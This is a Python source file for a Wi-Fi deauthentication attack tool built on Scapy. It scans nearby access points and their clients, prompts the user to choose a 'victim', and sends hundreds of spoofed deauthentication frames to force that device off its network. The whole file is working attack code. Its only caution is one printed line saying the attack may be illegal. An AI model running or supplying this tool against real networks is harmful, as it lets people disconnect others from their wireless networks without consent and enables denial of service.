import os
import time
from scapy.all import *
from classes import AccessPoint, StoppableThread
import threading
from tools import bar60Sec, check_user_input

wifiList = []
AP_list = {}
apDev = {}
change_ch_interface = ""


def sniffWIFI(iface):
    global change_ch_interface
    change_ch_interface = iface
    wifiList.clear()
    scannerWifi(iface)
    for ii in AP_list.keys():
        wifiList.append(ii)
    i = 0
    for ap in wifiList:
        print(str(i + 1) + ". " + ap)
        i = i + 1
    print("Pls choose wifi")
    attackAP = wifiList[check_user_input(input()) - 1]
    print("you choose " + str(attackAP) + "\nwait for instruction...")
    return AP_list[attackAP]


def scannerWifi(interface):
    channel_changer = StoppableThread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    print("Scanning...")
    wifiScan = AsyncSniffer(prn=callback, iface=interface, timeout=60)
    wifiScan.start()
    progressBarw = StoppableThread(target=bar60Sec())
    progressBarw.daemon = True
    progressBarw.start()
    # wifiScan.stop()
    channel_changer.stop()
    progressBarw.stop()
    print("\nfinish scanning!")


def sniffClient(AP):
    print("pls choose victim to attack")
    victims = []
    i = 0
    for ap in apDev.keys():
        if AP.bssid in apDev[ap]:
            victims.append(ap)
            print(str(i + 1) + ". " + ap)
            i = i + 1
    if i < 1:
        print("no station choose another AP")
        return
    return victims[check_user_input(input(">")) - 1]


def deauth_1(AP, client, interface):
    print("your going to disconnect " + str(client) + " from " + str(AP.ssid))
    print("Are you sure? its maybe illegal...(y/n)")
    os.system(f"iwconfig {interface} channel {AP.channel}")
    cherAccsept = input()
    if cherAccsept == 'y':
        deauth(interface, 400, AP.bssid, client)
        print("wait for instruction")


def deauth(iface: str, count: int, bssid: str, target_mac: str):
    dot11 = Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)
    frame = RadioTap() / dot11 / Dot11Deauth()
    sendp(frame, iface=iface, count=count, inter=0.100)
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=target_mac)
    frame = RadioTap() / dot11 / Dot11Deauth()
    sendp(frame, iface=iface, count=count, inter=0.100)


def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        # print(str(packet.addr1)+" "+ssid)
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        AP_list[ssid] = AccessPoint(bssid, ssid, dbm_signal, channel, crypto)
    bssid2 = packet.addr2
    bssid1 = packet.addr1
    if bssid1 in apDev:
        if bssid2 != "None":
            apDev[bssid1].append(bssid2)
    else:
        apDev[bssid1] = []


def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {change_ch_interface} channel {ch}")
        ch = ch % 14 + 1
        time.sleep(0.5)
